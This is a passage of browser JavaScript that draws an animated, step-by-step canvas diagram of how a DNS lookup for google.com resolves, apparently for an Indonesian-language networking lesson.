            drawRoundedRect(ctx, n.x - bw / 2, n.y - bh / 2, bw, bh, 6);
            ctx.fillStyle = c + '22';
            ctx.fill();
            ctx.strokeStyle = c;
            ctx.lineWidth = 1.5;
            ctx.stroke();

            ctx.fillStyle = c;
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';

            lines.forEach(function(line, i) {
                ctx.font = (i === 0 ? 'bold 11px' : '9px') + ' system-ui, sans-serif';
                if (i > 0) ctx.fillStyle = getColor('text2');
                ctx.fillText(line, n.x, n.y + (i - (lines.length - 1) / 2) * 14);
            });
        }

        function draw() {
            ctx.clearRect(0, 0, w, h);

            ctx.font = 'bold 14px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = getColor('text');
            ctx.fillText('DNS Resolution: google.com', w / 2, 18);

            // Draw all nodes
            Object.keys(nodes).forEach(function(key) {
                if (key === 'result' && step < 7) return;
                drawNode(key);
            });

            // Draw completed steps
            for (var i = 0; i <= step; i++) {
                var s = steps[i];
                var from = nodes[s.from], to = nodes[s.to];
                var p = (i < step) ? 1 : progress;
                var c = (i % 2 === 0) ? getColor('accent') : getColor('green');

                if (p > 0 && p < 1) {
                    drawPacket(ctx, from.x, from.y, to.x, to.y, c, s.label, p);
                }

                if (p >= 1) {
                    // Draw thin line showing completed path
                    ctx.beginPath();
                    ctx.moveTo(from.x, from.y);
                    ctx.lineTo(to.x, to.y);
                    ctx.strokeStyle = c + '33';
                    ctx.lineWidth = 1;
                    ctx.stroke();
                }
            }

            // Description
            if (step >= 0 && step < steps.length) {
                ctx.font = '12px system-ui, sans-serif';
                ctx.textAlign = 'center';
                ctx.fillStyle = getColor('text');
                ctx.fillText('Step ' + (step + 1) + ': ' + steps[step].desc, w / 2, h - 20);
            }

            if (step >= steps.length - 1 && progress >= 1) {
                ctx.font = 'bold 12px system-ui, sans-serif';
                ctx.textAlign = 'center';
                ctx.fillStyle = getColor('green');
                ctx.fillText('DNS Resolution Complete! Browser bisa konek ke 142.250.185.46', w / 2, h - 20);
            }
        }

        function animate() {
            if (!running) return;
            progress += 0.02;
            if (progress >= 1) {
                progress = 1;
                draw();
                if (step < steps.length - 1) {
                    setTimeout(function() {
                        step++;
                        progress = 0;
                        if (running) animId = requestAnimationFrame(animate);
                    }, 500);
                    return;
                } else {
                    running = false;
                    return;
                }
            }
            draw();
            animId = requestAnimationFrame(animate);
        }

        dnsFlowAnim.start = function() {
            if (running) return;
            step = 0; progress = 0; running = true;
            animate();
        };
        dnsFlowAnim.reset = function() {
            running = false;
            if (animId) cancelAnimationFrame(animId);
            step = -1; progress = 0;
            draw();
        };
        draw();
    })();
}
